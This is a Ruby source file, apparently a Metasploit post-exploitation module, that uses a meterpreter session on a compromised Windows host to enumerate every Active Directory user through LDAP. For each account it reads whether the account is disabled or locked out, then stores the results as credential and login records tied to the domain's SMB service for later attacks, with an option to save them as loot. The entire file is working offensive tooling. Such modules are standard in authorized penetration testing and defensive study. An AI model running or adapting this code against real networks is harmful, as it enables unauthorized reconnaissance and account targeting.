##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core'

class Metasploit3 < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP
  include Msf::Post::Windows::Accounts

  def initialize(info = {})
    super(update_info(info,
                      'Name'	       => 'Windows Gather Active Directory Users',
                      'Description'  => %{
                        This module will enumerate user accounts in the default Active Domain (AD) directory and stores
                      them in the database.
                      },
                      'License'      => MSF_LICENSE,
                      'Author'       => [ 'Ben Campbell' ],
                      'Platform'     => [ 'win' ],
                      'SessionTypes' => [ 'meterpreter' ]
      ))

    register_options([
      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false])
    ], self.class)
  end

  def run
    fields = ['sAMAccountName', 'userAccountControl']
    search_filter = '(&(objectCategory=person)(objectClass=user))'
    max_search = datastore['MAX_SEARCH']
    domain = datastore['DOMAIN'] || get_domain
    domain_ip = client.net.resolve.resolve_host(domain)[:ip]

    begin
      q = query(search_filter, max_search, fields)
      if q.nil? || q[:results].empty?
        return
      end
    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e
      # Can't bind or in a network w/ limited accounts
      print_error(e.message)
      return
    end

    # Results table holds raw string data
    results_table = Rex::Ui::Text::Table.new(
        'Header'     => "Domain Users",
        'Indent'     => 1,
        'SortIndex'  => -1,
        'Columns'    => fields
      )

    q[:results].each do |result|
      row = []

      result.each do |field|
        if field.nil?
          row << ""
        else
          row << field[:value]
        end
      end

      username = result.first[:value]
      uac = result[1][:value]
      store_username(username, uac, domain, domain_ip)

      results_table << row
    end

    print_line results_table.to_s

    if datastore['STORE_LOOT']
      stored_path = store_loot('ad.users', 'text/plain', session, results_table.to_csv)
      print_status("Results saved to: #{stored_path}")
    end
  end

  def parse_user_account_control(uac)
    res = {}
    disabled = (uac.to_i & 0x02) > 0
    lockout = (uac.to_i & 0x10) > 0
    res[:disabled] = disabled
    res[:lockout] = lockout
    res
  end

  def store_username(username, uac, realm, domain_ip)
    service_data = {
      address: domain_ip,
      port: 445,
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      username: username,
      realm_value: realm,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
    }

    credential_data.merge!(service_data)

    # Create the Metasploit::Credential::Core object
    credential_core = create_credential(credential_data)

    user_account_control = parse_user_account_control(uac)

    if user_account_control[:disabled]
      status = Metasploit::Model::Login::Status::DISABLED
    elsif user_account_control[:lockout]
      status = Metasploit::Model::Login::Status::LOCKED_OUT
    else
      status = Metasploit::Model::Login::Status::UNTRIED
    end

    # Assemble the options hash for creating the Metasploit::Credential::Login object
    login_data = {
      core: credential_core,
      status: status
    }

    login_data[:last_attempted_at] = DateTime.now unless (status == Metasploit::Model::Login::Status::UNTRIED)

    # Merge in the service data and create our Login
    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
